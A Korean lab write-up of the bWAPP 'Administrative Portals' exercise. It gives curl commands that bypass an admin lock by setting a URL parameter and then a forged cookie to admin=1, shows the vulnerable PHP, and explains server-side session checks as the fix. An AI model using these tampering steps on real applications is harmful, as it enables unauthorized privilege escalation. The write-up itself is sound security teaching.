# 웹 해킹 실습 교육: Session Mgmt. - Administrative Portals

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=0` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### Administrative Portals (Insecure Direct Object References / Session Mgmt) 취약점이란?

이 취약점은 애플리케이션이 주요 기능(ex. 관리자 페이지 접근 권한)을 통제할 때, 서버 측 세션(Session) 데이터를 기반으로 검증하지 않고 **사용자가 직접 조작할 수 있는 매개변수**(URL 파라미터, 쿠키 등)에 의존하는 잘못된 설계로 인해 발생합니다.

해당 실습 페이지는 일반 사용자 계정(`bee`)으로는 잠겨있어야 할(Locked) 관리자 페이지를 권한 체크 없이 단순 URL 쿼리 파라미터(`?admin=0`)로만 판별합니다. 공격자는 이 값을 변조하는 것만으로 손쉽게 관리자 권한을 우회 및 획득(Privilege Escalation)할 수 있습니다.

### OWASP Top 10 분류
- **A01:2021** – Broken Access Control

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약 페이지 (smgmt_admin_portal.php) 접근
        (권한 부족으로 'This page is locked.' 메시지 출력)
        │
        ▼
[2단계] [Level 0] 서버 요청 구조 분석 및 URL 변조
        ('?admin=0' 을 '?admin=1' 로 조작하여 인증 우회)
        │
        ▼
[3단계] [Level 1] 쿠키 파라미터 분석 및 쿠키 변조
        (Cookie에 'admin=1' 주입하여 인증 우회)
        │
        ▼
[4단계] [Level 2] 세션 기반 검증(방어 기법) 동작 확인
        (서버 메모리의 $_SESSION 값을 사용하여 클라이언트 조작 방어)
```

---

## 🛠️ 단계별 실습 (보안 레벨에 따른 우회 및 방어)

### Step 1: 기본 권한 상태 확인 (접근 거부)

현재 `bee` 계정의 권한으로 해당 페이지(`smgmt_admin_portal.php`)에 정상 접근을 시도하여 상태를 확인합니다.

```bash
# 정상적인 파라미터(admin=0)로 요청 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=0" | grep -i "locked"
```

**실행 결과:**
```html
<p><font color="red">This page is locked.</font><p>HINT: check the URL...</p></p>
```

> 💡 페이지 내에서 HINT로 제공하듯 URL을 확인하라는 메시지와 함께, 권한 없음(locked)으로 관리 기능이 차단된 것을 알 수 있습니다.

---

### Step 2: Security Level 0 (Low) - 권한 우회 (URL 파라미터 조작)

보안 레벨이 낮을 때(Level 0), `$_GET["admin"]` 인자만으로 권한을 체크하는 허점을 이용합니다.

```bash
# 악의적인 파라미터 조작(admin=1)으로 요청 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=1" | grep -i "Cowabunga"
```

**실행 결과:**
```html
<p>Cowabunga...<p><font color="green">You unlocked this page using an URL manipulation.</font></p></p>
```

---

### Step 3: Security Level 1 (Medium) - 권한 우회 (쿠키 조작)

보안 레벨이 중간일 때(Level 1), URL 파라미터를 보지 않는 대신 **쿠키(Cookie)**에 담긴 `$_COOKIE["admin"]` 값을 검증합니다. 공격자는 헤더에 담기는 쿠키 역시 손쉽게 위조할 수 있습니다.

```bash
# 쿠키 내에 인증 변수(admin=1)를 강제로 주입하여 요청
curl -s \
     -b "admin=1; security_level=1; PHPSESSID=..." \
     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php" | grep -i "Cowabunga"
```

**실행 결과:**
```html
<p>Cowabunga...<p><font color="green">You unlocked this page using a cookie manipulation.</font></p></p>
```

> 🚨 **취약점 작동 확인**: 보이지 않는 HTTP 헤더 (쿠키) 영역조차도 사용자가 완벽히 통제할 수 있으므로, 권한 인가 처리를 클라이언트에게 맡기면 필연적으로 우회됩니다.

---

### Step 4: Security Level 2 (High) - 방어 메커니즘 (Server-Side Session 검증)

최고 보안 레벨(Level 2)에서는 클라이언트가 전송하는 URL 파라미터나 쿠키를 일절 신뢰하지 않습니다. 대신 **서버 측 메모리에 할당된 세션 변수**(`$_SESSION["admin"]`)를 대조합니다.

> "Cowabunga..." 메시지와 함께 "contact your dba..." 힌트가 출력되며 접근이 차단됩니다. 클라이언트에서 임의로 세션 값을 조작하는 것은 불가능하기에 해당 취약점은 성립하지 않으며, **오직 DB 내 권한 계정(admin column)이 직접 변경되어야만** 정상 인가 처리가 이뤄집니다.

---

## 📊 공격 결과 요약

| 보안 적용 기준 | 내용 |
|-----------|------------------|
| **Level 0 (Low)** | URL 파라미터 변조 단계 우회 (`admin=0` -> `admin=1`)를 통해 최고 권한 획득 |
| **Level 1 (Medium)** | HTTP 요청 시 쿠키 변조 값 반입 (`Cookie: admin=1`)을 통한 최고 권한 획득 |
| **Level 2 (High)** | 서버 세션(Session) 기반 로직이 적용되어 사실상 **클라이언트 측 권한 우회 공격 원천 차단** |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 메커니즘
해당 PHP 백엔드에서는 권한을 판별할 때, 사용자가 임의 조작이 불가능한 서버 세션(`$_SESSION['admin_auth']`)을 사용하지 않고 오직 GET 인자(`$_GET['admin']`)로 넘어오는 값만을 조건비교 하여 통과시키고 있었습니다.

```php
// bWAPP의 취약한 권한 검증 로직 전문
if(isset($_GET["admin"])) {
    if($_GET["admin"] == "1") {
        $message = "Cowabunga... <font color=\"green\">You unlocked this page using an URL manipulation.</font>";
    } else {
        $message = "<font color=\"red\">This page is locked.</font>";
    }
}
```

### 방어(Secure Coding) 가이드

1. **서버 사이드 상태(Session) 변수를 통한 권한 저장 및 입증 ⭐️**
   관리자 권한, 계정 권한 등 중요한 상태는 절대로 URL Parameter, Hidden Field, 일반 Cookie(평문)에 담아 전달해선 안 됩니다. 
   사용자가 로그인할 때 DB의 정보와 대조하여 서버의 `Session` 객체 메모리에 안전하게 저장(`$_SESSION['role'] = 'admin'`) 하고 이 값을 통해 로직을 검증해야 합니다. 

2. **사용자 환경(Parameter)의 신뢰 단절**
   클라이언트 측에서 전송되는 모든 데이터(`POST`, `GET`, `Cookie`)는 언제는 프록시 툴(ex. Burp Suite)이나 브라우저 조작에 의해 위변조 될 수 있음을 가정하고 처리해야 합니다. 

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
